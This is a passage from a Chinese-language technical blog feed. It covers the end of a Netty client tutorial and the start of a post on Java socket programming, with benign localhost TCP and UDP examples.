class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>是不是很简单了。</p><h3 id="客户端">客户端</h3><p>客户端构建大致流程如下：</p><figure><img src="/img/Netty框架学习/image-20230110000537717.png"alt="Netty客户端构建流程" /><figcaption aria-hidden="true">Netty客户端构建流程</figcaption></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.bootstrap.Bootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioSocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimerClient</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConnectHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(ChannelHandlerContext ctx, SocketAddress remoteAddress, SocketAddress localAddress,</span></span><br><span class="line"><span class="params">                            ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;** from ConnectHandler : &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; 连接成功 **&quot;</span>);</span><br><span class="line">            <span class="built_in">super</span>.connect(ctx, remoteAddress, localAddress, promise);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 写事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WriteHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            System.out.println(<span class="string">&quot;** from WriteHandler : &quot;</span> + Thread.currentThread().getName()</span><br><span class="line">                    + <span class="string">&quot; 消息： ## &quot;</span> + buf.toString(StandardCharsets.UTF_8)</span><br><span class="line">                    + <span class="string">&quot; ## 发送成功 **&quot;</span>);</span><br><span class="line">            <span class="built_in">super</span>.write(ctx, msg, promise);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ResponseHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> &#123;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            <span class="type">byte</span>[] response = <span class="keyword">new</span> <span class="title class_">byte</span>[buf.readableBytes()];</span><br><span class="line">            buf.readBytes(response);</span><br><span class="line">            System.out.println(<span class="string">&quot;** from TimeClientHandler : &quot;</span> + Thread.currentThread().getName()</span><br><span class="line">                    + <span class="string">&quot; 消息： ## &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(response, StandardCharsets.UTF_8)</span><br><span class="line">                    + <span class="string">&quot; ## 接收成功 **&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将我们的handlers注册到pipeline中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HandlersRegister</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> &#123;</span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">ConnectHandler</span>(), <span class="keyword">new</span> <span class="title class_">WriteHandler</span>(), <span class="keyword">new</span> <span class="title class_">ResponseHandler</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> port, String host)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">group</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Bootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bootstrap</span>();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioSocketChannel.class)</span><br><span class="line">                    .option(ChannelOption.TCP_NODELAY, <span class="literal">true</span>)</span><br><span class="line">                    .handler(<span class="keyword">new</span> <span class="title class_">HandlersRegister</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 异步连接服务端</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">f</span> <span class="operator">=</span> bootstrap.connect(host, port).sync();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送消息</span></span><br><span class="line">            <span class="keyword">if</span> (f.channel().isActive()) &#123;</span><br><span class="line">                <span class="type">byte</span>[] request = <span class="string">&quot;QUERY&quot;</span>.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">ByteBuf</span> <span class="variable">msg</span> <span class="operator">=</span> Unpooled.buffer(request.length);</span><br><span class="line">                msg.writeBytes(request);</span><br><span class="line">                f.channel().writeAndFlush(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭</span></span><br><span class="line">            f.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            group.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TimerClient</span>().connect(<span class="number">9999</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下图：</p><figure><img src="/img/Netty框架学习/image-20230119194555388.png"alt="运行结果" /><figcaption aria-hidden="true">运行结果</figcaption></figure><p>客户端和我分别发出了请求，终端中输出表明服务结果没问题。着重看右边的终端，可以看到<strong>连接、写、读事件</strong>都可以看到对应拦截的日志输出，这也说明我们定义的拦截器发挥作用了。</p><h1 id="参考文献">参考文献</h1><ul><li>《Scalable IO in Java》——Doug Lea（Java 之父）</li><li>《Netty权威指南 （第2版）》——李林锋</li><li>《Netty in Action（Netty 实战）》——Norman Maurer（何品 译）</li><li><ahref="https://zhuanlan.zhihu.com/p/536334873">Netty系列教程（二）Netty架构设计剖析- 知乎 (zhihu.com)</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇学习一下Netty框架，Netty是一个Java实现的、非常流行的NIO网络编程框架，很多知名项目如a阿里的Dubbo、Spark、ElasticSearch、Hadoop、蚂蚁金服的SOFABolt、谷歌的gRPC等等。学习前建议先掌握Java中NIO相关API的使用，并理解Unix操作系统中I/O多路复用模型的理论。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Netty框架学习/components.png&quot; alt=&quot;components&quot; style=&quot;zoom:100%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="网络编程" scheme="https://lzwgiter.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java网络编程模型复习</title>
    <link href="https://lzwgiter.github.io/posts/d6b305b7.html"/>
    <id>https://lzwgiter.github.io/posts/d6b305b7.html</id>
    <published>2023-01-03T17:06:09.000Z</published>
    <updated>2023-01-18T02:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>失踪人口回归...，2022年几乎没怎么好好写博客，一方面原因是因为科研，另一方面...懒了懒了我错了。年底中招奥密克戎，最近也是才缓过劲来，真是坎坷的一年。本科之前其实接触过C语言的网络编程，带课的李金库老师讲的很好，记得当时特别地对I/O多路复用(select)留下了<ahref="https://github.com/lzwgiter/MyCWebStudy">很深的印象</a>。今天复习一下Java中网络编程的相关理论和代码，包括最基础的Sokcet使用以及三种I/O模型。（ps：<strong>我gitee的博客由于部分文章没法过审核，因此gitee博客以后可能就不会更新了，我仍然使用github博客为主。</strong></p><p><img src="/img/Java网络编程模型Review/db04ec35da1f9962545649576098426a.jpeg" alt="db04ec35da1f9962545649576098426a" style="zoom:67%;" /></p></blockquote><span id="more"></span><h1 id="什么是socketjava中如何使用">什么是Socket？Java中如何使用？</h1><p>老生常谈的问题了，什么是Socket？也即套接字？</p><p>首先我们要了解一下，什么是<strong>进程间通信（InterProcessCommunication,IPC）</strong>，操作系统中时时刻刻都有大量的进程在运行，每一个进程实体都由<strong>数据、程序代码和进程控制块(PCB)</strong>组成，每个进程都在自己的地址范围内运行，操作系统通过<strong>PCB</strong>控制进程，进程根据<strong>程序代码</strong>对<strong>数据</strong>进行处理计算。当两个进程之间需要通信的时候，操作系统为我们提供了很多途径，如UNIX中的pipe，下图是一个父子进程使用的普通管道，此外还有对等进程使用的命名管道。</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_131726.jpg"alt="Unix中的普通管道" /><figcaption aria-hidden="true">Unix中的普通管道</figcaption></figure><p>上述的计算和通信过程都是在<strong>一个机器内部</strong>发生的，因此我们很容易就会想到，那<strong>不同机器上的不同进程如何通信呢？</strong>ok，这就是网络编程干的事情。</p><p>操作系统为我们提供了Socket来完成这件事情。提供这个干什么呢？具体来说，既然是网络编程，那我们必定是要使用<strong>网络协议栈</strong>的，也即TCP/IP四层模型：应用层、传输层、网络层和网络接口层，Socket为作为应用层开发者的我们，提供了一种简单的使用网络协议栈的方法。如man手册中就一言以蔽之：</p><blockquote><p>The BSD compatible sockets are the uniform interface between the userprocess and the network protocol stacks in the kernel.</p><p>BSD(Berkeley Software Distribution, 伯克利软件套件)sockets是用户进程和内核中网络协议栈之间的通用接口。ps：这东西最早是伯克利大学开发的</p></blockquote><h2id="socket是为了解决网络编程中的什么问题">Socket是为了解决网络编程中的什么问题？</h2><p>我们深入探讨一下，Socket的出发点是为了解决什么问题。同样，我们先看看单机中进程通信的一个最基本的问题。</p><p>单机中，不同的进程运行在不同的地址空间内，当发生通信时，如何寻找另一个进程呢？</p><ul><li>通过PID，即processidentifier，通过这唯一的进程标识符，我们就可以唯一地确定一个进程。可以通过命令<code>ulimit -n</code>和查看<code>/proc/sys/kernel/pid_max</code>来知道pid的实际以及理论上限。</li></ul><p>那么自然而然的，<strong>问题1：</strong>网络编程中，本地的进程如何寻找另一个机器上的进程呢？也是使用PID吗？那万一这俩进程号一样，怎么确定唯一性呢？那用IP？关键这个机器上进程很多啊，你说个127.0.0.1我也不知道是哪个进程啊？</p><p>所以TCP/IP协议中才设计了<strong>传输层协议端口</strong>这个东西，我们使用一个端口号唯一确定一个进程，结合IP地址，我们就可以唯一的确定<strong>一台主机上的一个进程</strong>了，我们用一个五元组在全局中唯一表示一个<strong>网间进程通信：（传输层协议，本地IP，本地端口，远程IP，远程端口）</strong>。</p><p>如下图是TCP和UDP两种不同传输层协议的报文格式，这就是为什么报文中要有端口号。由于端口号是一个16bit的的字段，因此，共有<code>2^16=65535</code>个端口号可供我们使用，其中<code>0-1023</code>属于保留的端口(well-knowport)，<code>1-255</code>给一些常见服务如如HTTP 80、HTTPS 443、FTP21、DNS 53、SMTP25等等，<code>256-1023</code>保留给如路由等协议。而<code>1024-4999</code>可以作为任意客户的端口，<code>5000-65535</code>这个庞大的空间作为用户的服务器端口（毕竟连接服务器的人多嘛）。</p><figure><img src="/img/Java网络编程模型Review/报文格式.jpg"alt="TCP、UDP报文格式" /><figcaption aria-hidden="true">TCP、UDP报文格式</figcaption></figure><p>除了<strong>问题1</strong>，我们还面临着如下三个问题：</p><ol type="1"><li>如何连接网络剧哦协议栈</li><li>不同网络协议（如IPX/SPX）如何识别</li><li>不同应用的数据传输可靠性、速率等要求不同，如何实现有选择地使用网络协议栈提供的不同服务（即TCPor UDP）</li></ol><p>那上述问题，socket都帮我们解决了，socket作为操作系统本身的系统调用，为我们提供了使用网络协议栈的方法；socket创建时<code>int socket(int domain, int type, int protocol);</code>，为我们提供了不同网络协议的选择方法（如AF_IPX字段代表IPX协议、AF_DECnet代表DECet协议等等）；socket也可以让我们选择不同的传输层协议（SOCK_STREAM即TCP、SOCK_DGRAM即UDP）。</p><h2 id="java中的socket">Java中的Socket</h2><h3 id="tcp">TCP</h3><p>我们先看看在C语言中，也即UNIX系统中是如何创建并使用一个TCP类型的socket的。具体以C/S架构为例，如图所示：</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_130809.jpg"alt="TCP网络编程流程" /><figcaption aria-hidden="true">TCP网络编程流程</figcaption></figure><p>根据角色分一下类，我们可以看到，客户端程序和服务端程序需要执行的函数是有区别的：</p><ul><li>客户端不需要被动Listen</li><li>不需要绑定本地端口（即随机从1024-65535中选取一个），</li><li>不需要Accept远程机器的连接。</li></ul><p>因此，面向对象嘛，Java对这两种不同职责的Socket进行了划分，分别为<code>java.net.Socket</code>和<code>java.net.ServerSocket</code>，这俩的区别其实就是上面提到的三点。二者关系如下：</p><figure><img src="/img/Java网络编程模型Review/diffSocket.png"alt="Java中TCP网络编程常用类" /><figcaption aria-hidden="true">Java中TCP网络编程常用类</figcaption></figure><h4 id="服务端代码">服务端代码</h4><p>我们写一个简单的服务端，他将接收客户端的请求ID，并为其返回对应的数据。我们要使用到上面提到的<code>java.net.ServerSocket</code>，他的生命周期如下：</p><figure><img src="/img/Java网络编程模型Review/ServerSocket生命周期.png"alt="ServerSocket生命周期" /><figcaption aria-hidden="true">ServerSocket生命周期</figcaption></figure><p>下面我们将实现一个服务端程序，他接收客户端发来的个位数，并返回这个个位数的英文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TCP 服务端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOTCPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ArrayList&lt;String&gt; DICT = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">            Arrays.asList(<span class="string">&quot;Zero&quot;</span>, <span class="string">&quot;One&quot;</span>, <span class="string">&quot;Two&quot;</span>, <span class="string">&quot;Three&quot;</span>, <span class="string">&quot;Four&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Five&quot;</span>, <span class="string">&quot;Six&quot;</span>, <span class="string">&quot;Seven&quot;</span>, <span class="string">&quot;Eight&quot;</span>, <span class="string">&quot;Nine&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里默认完成了bind的操作，你也可以通过无参构造，然后手动bind一个SocketAddress</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">6666</span>)) &#123;</span><br><span class="line">            <span class="comment">// 一直运行</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">char</span>[] data = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="comment">// 阻塞等待连接</span></span><br><span class="line">                <span class="type">Socket</span> <span class="variable">requestSocket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">                <span class="comment">// 收到请求</span></span><br><span class="line">                System.out.println(<span class="string">&quot;# 客户端连接：&quot;</span> + requestSocket.getRemoteSocketAddress() + <span class="string">&quot; #&quot;</span>);</span><br><span class="line">                <span class="comment">// 接收数据并处理</span></span><br><span class="line">                <span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(requestSocket.getInputStream());</span><br><span class="line">                reader.read(data);</span><br><span class="line">                <span class="comment">// 返回数据</span></span><br><span class="line">                <span class="type">Writer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(requestSocket.getOutputStream());</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                out.write(DICT.get(Integer.parseInt(String.valueOf(data))));</span><br><span class="line">                out.flush();</span><br><span class="line">                <span class="comment">// 关闭连接</span></span><br><span class="line">                requestSocket.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            System.err.println(ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端代码">客户端代码</h4><p>对应我们的服务端，客户端代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TCP 客户端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建连接（注意，这里会直接connect，你也可以通过无参构造，手动connect一个SocketAddress</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6666</span>);) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;本地的Socket信息：&quot;</span> + client.getLocalSocketAddress());</span><br><span class="line">            System.out.println(<span class="string">&quot;远程的Socket信息：&quot;</span> + client.getRemoteSocketAddress());</span><br><span class="line">            <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(client.getOutputStream());</span><br><span class="line">            <span class="type">char</span>[] wordToInquire = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;2&#x27;</span>&#125;;</span><br><span class="line">            writer.write(wordToInquire);</span><br><span class="line">            writer.flush();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            <span class="type">char</span>[] result = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">10</span>];</span><br><span class="line">            <span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(client.getInputStream());</span><br><span class="line">            reader.read(result);</span><br><span class="line">            System.out.println(String.valueOf(wordToInquire) + <span class="string">&quot; in English is &quot;</span> + String.valueOf(result).trim());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;主机名无法解析&quot;</span> + ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            System.err.println(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行结果">运行结果</h4><p>最后我们的运行结果如下图所示：</p><figure><img src="/img/Java网络编程模型Review/image-20230103204535977.png"alt="BIO TCP运行结果" /><figcaption aria-hidden="true">BIO TCP运行结果</figcaption></figure><p>在这个过程中我重启了两次客户端程序，可以看到：</p><ul><li>每次的本地客户端端口都是随机选取的。</li><li>客户端程序结束了，但服务端会一直<strong>阻塞</strong>在<code>accept()</code>等待新的连接。</li></ul><h3 id="udp">UDP</h3><p>相较于TCP需要三次握手建立连接的过程，UDP协议不需要该过程，当然也没提供TCP那些什么滑动窗口、差错控制等等，毕竟你看他报文那么简单嘛。</p><p>我们还是看看C语言中是什么样子的，具体如下：</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_130921.jpg"alt="UDP报文格式" /><figcaption aria-hidden="true">UDP报文格式</figcaption></figure><p>仍然是分开看一下Java中客户端和服务器端要做的事情：</p><p>服务端：</p><ul><li>创建UDP类型套接字并绑定IP、端口</li><li>阻塞等待接收数据报文</li><li>接收后处理并返回</li><li>关闭套接字</li></ul><p>客户端：</p><ul><li>创建UDP类型套接字</li><li>向服务端发送数据报文</li><li>接收数据包</li><li>关闭套接字</li></ul><p>为了实现上述功能，Java中定义了<code>java.net.DatagramPacket</code>和<code>java.net.DatagramSocket</code>来负责上述功能，我们通过<code>DatagramPacket</code>来封装和解封数据，用<code>DatagramSocket</code>来发送<code>DatagramPacket</code>数据包。</p><figure><img src="/img/Java网络编程模型Review/UDP数据结构.png"alt="Java中UDP网络编程常用类" /><figcaption aria-hidden="true">Java中UDP网络编程常用类</figcaption></figure><h4 id="服务端代码-1">服务端代码</h4><p>这里实现的功能与上一章节相同，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 